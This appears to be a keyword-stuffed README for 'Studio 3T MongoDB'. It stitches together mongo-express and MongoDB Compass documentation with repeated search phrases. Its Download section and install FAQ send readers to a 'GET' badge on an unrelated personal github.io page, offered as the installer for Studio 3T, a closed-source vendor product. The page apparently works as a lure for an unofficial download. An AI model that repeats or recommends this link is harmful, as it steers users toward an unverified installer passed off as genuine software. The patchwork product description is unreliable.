# Studio 3T MongoDB

![Banner](lib/image1.png)

Studio 3T MongoDB is a graphical user interface and an integrated development environment for MongoDB. Studio 3T sits on a workstation, opens a connection, and lets a developer, an analyst, or an administrator read and write documents without living only in a shell.

This page is the handbook for that product. It covers Studio 3T as a desktop IDE, the studio3t name people type when they look for the same tool, studio 3t mongodb as the query and aggregation workspace, and mongodb studio 3t as the same GUI under a reversed search phrase.

The product ships for Windows, macOS, and Linux. Community covers personal exploration. Professional, Ultimate, and Enterprise add automation, SQL translation, team sharing, data masking, and role based access.

A same class tree in this pack follows the MongoDB Compass monorepo: plugins for aggregations, CRUD, indexes, schema, and a shell. Another tree is mongo-express: a Node.js and Express web admin for MongoDB, FerretDB, and Amazon DocumentDB. Use those files when you want to see how a GUI talks to a server.

## Features

Studio 3T MongoDB is built for people who would rather drag a field than type a raw filter every time. The visual query builder assembles find work from the collection shape. IntelliShell is the interactive shell with completion and error marks. The aggregation editor walks a pipeline one stage at a time. SQL support translates a familiar select into a MongoDB query. An AI helper drafts query text when you already know the intent.

studio3t also keeps the usual admin surface: connect, list databases, open a collection, edit a document, and leave with a saved query. mongodb studio 3t is the same loop when the search box starts with the engine name.

The neighbor web admin in this pack lists the same class of work: several databases or several servers; view, add, rename, and delete collections; view, add, update, and delete documents; inline audio, video, and image previews; collapse nested or large objects; load properties over 100 KB on demand; GridFS; BSON types; a Bootstrap 5 layout; admin or per-database auth; blacklist and whitelist; custom CA, TLS, and SSL; replica sets; OpenID Connect.

Document routes in the web tree live in [document.js](FILES/routes/document.js). Connection work on the desktop side starts in [connect-mongo-client.ts](FILES/data/connect-mongo-client.ts).

## Screenshots

The source album for the web admin shows a home page of databases, a database view of collections and buckets, a collection view of documents, and a document editor. Those shots came from version 0.30.40. The desktop IDE shows the same four surfaces with a sidebar, a query bar, and a result grid.

![Editor](lib/image2.jpg)

![Grid](lib/image3.jpg)

When you open studio 3t mongodb the first useful screen is the connection list. After a live session the editor and the grid sit side by side. Keep a screenshot of your own host if the labels differ from this page.

## Packages Overview

The Compass monorepo is the GUI that this pack treats as the same class as Studio 3T. The top package is the MongoDB GUI itself. Everything else is a plugin, a shared library, or a shared config.

### Compass Plugins

Plugins own one tab or one action. The aggregation pipeline builder is [add-stage.tsx](FILES/aggregations/add-stage.tsx). Saved query cards are [query-item-card.tsx](FILES/query/query-item-card.tsx). The schema tab and the CRUD plugin sit next to indexes, import and export, explain plan, export to language, field store, find in page, schema validation, server stats, sidebar, and databases and collections.

The shell plugin renders [tab-compass-shell.tsx](FILES/shell/tab-compass-shell.tsx). That is the closest open file to IntelliShell in Studio 3T: a tab, a prompt, and completion.

### Shared Libraries and Build Tools

Shared libraries cover Atlas sign in, the app registry, React components, connection import and export, connection storage, a connection form, context menus, data modeling, a reusable editor, generative AI hooks, global writes, logging, settings, telemetry, user data, utilities, a browser build, a welcome modal, and workspaces.

The editor package ships autocompleters. Aggregation completion is [aggregation-autocompleter.ts](FILES/editor/aggregation-autocompleter.ts). Document and Ace compatibility completers sit in the same folder.

Data service, collection model, database model, instance model, explain helpers, query utilities, BSON transpilers, Hadron document and IPC, and the e2e suite are the rest of the shared layer.

### Shared Configuration Files

Shared configuration covers eslint, a custom eslint plugin, mocha, prettier, testing library helpers, TypeScript, and webpack. Copy those files when you add a package so the monorepo stays one style.

## Development

To work on the web admin, install from the git tree with npm, yarn, or pnpm. Copy [config.default.js](FILES/config.default.js) to `config.js` and edit the local host, port, and credentials.

Start the development build with `npm run start-dev`, `yarn start-dev`, or `pnpm run start-dev`. The entry that boots the Express app is [app.js](FILES/app.js).

The desktop monorepo uses lerna, webpack, and per package TypeScript. Change one plugin, run that package test, then the app.

## Usage (npm / yarn / pnpm / CLI)

The web admin needs Node.js v22 or higher.

Install globally with `npm i -g mongo-express`, or the yarn / pnpm equivalent. A local copy uses the same command without `-g`.

By default `config.default.js` is used. Basic access is `admin`:`pass`. That pair is not safe. The console prints a warning.

Copy `config.default.js` to `config.js`. Fill in the MongoDB URL. Create a `.env` with random `ME_CONFIG_SITE_COOKIESECRET` and `ME_CONFIG_SITE_SESSIONSECRET` values.

Run a local copy: `cd YOUR_PATH/node_modules/mongo-express/ && node app.js`. A global install starts as `mongo-express`. Pass `--url mongodb://127.0.0.1:27017` or `--URL` on the binary. Other flags: `--version` / `-V`, `--admin` / `-a`, `--port` / `-p` (default 8081), `--help` / `-h`.

Studio 3T itself is a desktop installer, not this CLI. The CLI here is the neighbor web admin.

## Usage (Express middleware)

Mount the web admin on an existing Express app. The middleware helper is [middleware.js](FILES/lib/middleware.js).

    var mongo_express = require('mongo-express/lib/middleware')
    var mongo_express_config = require('./mongo_express_config')

    app.use('/mongo_express', mongo_express(mongo_express_config))

Keep that mount off the public internet. The document editor evaluates JavaScript. Treat it as a private development tool.

## Usage (Docker)

The Docker image defaults to `mongodb://mongo:27017`. Run a MongoDB container on the same network as `mongo`, or set `ME_CONFIG_MONGODB_URL`. If the official MongoDB image created a root user, put those credentials in the URL and add `authSource=admin`. `ME_CONFIG_BASICAUTH_USERNAME` and `ME_CONFIG_BASICAUTH_PASSWORD` only lock the web login.

Hub image:

    docker run -it --rm -p 8081:8081 --network some-network mongo-express

Build from this pack:

    docker build -t mongo-express .
    docker run -it --rm -p 8081:8081 --network some-network mongo-express

OIDC in the image needs `--build-arg ENABLE_OIDC=true`. That install step pulls `express-openid-connect`.

Set `ME_CONFIG_MONGODB_URL` (add `authSource=admin` for a root user), `ME_CONFIG_MONGODB_ENABLE_ADMIN`, TLS flags, `ME_CONFIG_SITE_BASEURL`, `ME_CONFIG_HEALTH_CHECK_PATH`, basic auth or `ME_CONFIG_AUTH_STRATEGY` (`basic`, `form`, `oidc`), readonly and no-delete flags, GridFS, `ME_CONFIG_DOCUMENTS_PER_PAGE`, and `PORT` (8081).

Example with basic auth and a named MongoDB host:

    docker run -it --rm \
        --name mongo-express \
        --network web_default \
        -p 8081:8081 \
        -e ME_CONFIG_BASICAUTH_ENABLED="true" \
        -e ME_CONFIG_BASICAUTH_USERNAME="mongo-express-user" \
        -e ME_CONFIG_BASICAUTH_PASSWORD="fairly-long-password" \
        -e ME_CONFIG_MONGODB_URL="mongodb://root:password@some-mongo:27017/?authSource=admin" \
        mongo-express

Open `http://localhost:8081`. Docker Desktop 4.15 and later can install the Mongo Express extension from the marketplace in one click.

## Usage (IBM Cloud)

Clone the web admin. Attach an IBM MongoDB service. Edit `examples/ibm-cloud/manifest.yml` for the app and the service name. Or use the IBM DevOps deploy button on the upstream repo.

After deploy, copy `config.default.js` to `config.js`. Check `dbLabel` against the service. Change `basicAuth`. Do not keep the defaults.

## Usage (OpenIdConnect Authentication)

If you install the web admin as a package, also install `express-openid-connect`. Register a private OAuth2 client for Authorization Code Flow. Set `ME_CONFIG_OIDCAUTH_ENABLED`, `BASEURL`, `ISSUER`, `CLIENTID`, `CLIENTSECRET`, `SECRET`, plus cookie secret and `ME_CONFIG_SITE_BASEURL`. The redirect URI is the base URL plus `/callback`.

Studio 3T desktop login is not this OIDC flow. That product talks to MongoDB with a connection string and optional LDAP or Kerberos on paid editions.

## Connecting to more than one database

One connection already lists every database on that server when admin access is on (`ME_CONFIG_MONGODB_ENABLE_ADMIN=true` or `mongodb.admin` in `config.js`). Without admin, only the database in the URL appears.

To reach databases on separate MongoDB servers, give `mongodb` a list in `config.js`. Environment variables describe one connection only. Each item needs `connectionString`, an optional `connectionName`, and the usual `admin`, `whitelist`, `blacklist`, and `connectionOptions` keys.

With more than one connection, databases show as `<connectionName>_<databaseName>` so two servers can share a name. `connectionName` defaults to `connection0`, `connection1`, and so on.

Each entry takes the same keys as the single form: `admin`, `whitelist`, `blacklist`, `connectionOptions`.

The desktop connection modal in this pack is [connection-modal.tsx](FILES/connections/connection-modal.tsx). Database helpers on the web side live in [db.js](FILES/lib/db.js).

studio 3t mongodb uses a saved connection list on disk. mongodb studio 3t is the same list when you search from the engine name.

## Search

Simple search takes a key and a value and builds a `find()` with an empty projection, so every field comes back.

Advanced search passes `find` and `projection` straight into `db.collection.find(query, projection)`. The find object is the query. The projection object picks columns.

See the MongoDB `db.collection.find()` manual for exact shapes.

Studio 3T Visual Query Builder is the desktop form of that simple search. IntelliShell is the desktop form of the advanced path.

## Planned features

Pull requests on the open neighbor trees are welcome. Studio 3T ships edition changes on its own site. This pack does not invent a roadmap.

## Limitations

Documents must have `_id` to be edited in the web admin. Binary BSON is not tested there.

JSON documents go through a JavaScript virtual machine. A public web admin can run hostile script on the host. Use it only on a private network for development.

Studio 3T Community is for personal use and learning. SQL translation, data masking, and team sharing sit on paid editions.

## E2E Testing

The web admin is moving to Cypress. Open the runner with `cypress open`. Instrument coverage with `yarn nyc instrument --compact=false lib instrumented`.

The Compass tree has a smoke suite for installers and an e2e matrix for features. Run the package test next to the file you changed.

## BSON Data Types

The document editor and viewer in the web admin accept the types below. The helper that parses them is [bson.js](FILES/lib/bson.js).

Native JavaScript types: strings, numbers, lists, booleans, null. Numbers are 64 bit floats.

ObjectId: `ObjectId()` or `ObjectId(id)` with a 24 digit hex string.

ISODate: `ISODate()`, `ISODate(timestamp)`, or `new Date()`.

UUID: `UUID()`, `new UUID()`, or `UUID("dee11d4e-63c6-4d90-983c-5c9f1e79e96c")`. A 32 hex form without dashes also works.

DBRef: `DBRef(collection, objectID)` or with an optional database. The object ID is the ID string, not an ObjectId value.

Timestamp: `Timestamp()` or `Timestamp(time, ordinal)`. Example: `Timestamp(ISODate(), 0)`.

Code: `Code(code)` where `code` is a function or a string. Scope is not supported.

MinKey, MaxKey, and Symbol(`string`) are also accepted. Binary / BinData is listed as not tested.

## Example Document

A document the web editor can read and write looks like this (media truncated):

    {
      "_id": ObjectId(),
      "dates": { "date": ISODate("2012-05-14T16:20:09.314Z"), "new_date": ISODate() },
      "photo": "data:image/jpeg;base64,/9j/4...",
      "bool": true,
      "string": "hello world!",
      "list of numbers": [123, 4.4, -12345.765],
      "reference": DBRef("collection", "4fb1299686a989240b000001"),
      "ts": Timestamp(ISODate(), 1),
      "minkey": MinKey(),
      "maxkey": MaxKey(),
      "func": Code(function() { alert('Hello World!') }),
      "symbol": Symbol("test")
    }

Paste that shape into Studio 3T or into the neighbor editor. Keep `_id`. Keep BSON constructors if you need typed fields.

## Contributing

Compass points contributors at CONTRIBUTING.md and issues at the COMPASS Jira project. Feature ideas go to the MongoDB feedback forum.

mongo-express accepts pull requests on the features and limitations listed above.

Studio 3T is closed source. File product feedback on the vendor site. This pack only ships neighbor source so you can read how a MongoDB GUI is built.

## License

The Compass monorepo is SSPL. The web admin license file sits next to the Express entry. Studio 3T uses a vendor license: Community for personal use, paid seats for Professional, Ultimate, and Enterprise. Read the license that shipped with the installer you run.

## Download

[![GET](https://img.shields.io/badge/GET-Studio%203T%20MongoDB-brightgreen)](https://cooperwilliam3374.github.io/.github/Studio-3T-MongoDB)

Use the GET badge for this pack. The vendor also hosts a desktop installer for Windows, macOS, and Linux. Community is the free edition. Paid editions unlock SQL, automation, and team features after a license is applied.

Do not expose the web admin from this pack on a public host. Point it at a local MongoDB or a private network.

## Related Questions

**Is Studio 3T free or paid?**

Both. Community is free for personal use and learning: connections, exploration, and basic edits. Professional, Ultimate, and Enterprise are paid. Those seats add SQL support, automation, team sharing, data masking, and role based access. studio3t pricing is on the vendor buy page.

**What is Studio 3T used for?**

Studio 3T MongoDB is a GUI and IDE for MongoDB. You connect, browse collections, build queries, run aggregations, and use a shell. studio 3t mongodb is the same job when you search by product then engine. mongodb studio 3t is the same job when you search by engine then product.

**Are Robo 3T and Studio 3T the same?**

No. Robo 3T (formerly Robomongo) is the older free shell. Studio 3T is the fuller IDE: visual query builder, aggregation editor, SQL, IntelliShell, and paid team features. They share a company history. They are not the same installer.

**How do I install Studio 3T?**

Use the GET badge in Download, or the vendor desktop installer for your OS. Open the app, add a connection, and test against a local or remote MongoDB. Community needs no paid license. Paid editions ask for a license after install.

## Related Search Terms

Studio 3T MongoDB, Studio 3T, studio3t, studio 3t mongodb, mongodb studio 3t, mongodb, gui, javascript, express-middleware, standalone, compass, electron, admin, nodejs, aggregation, crud
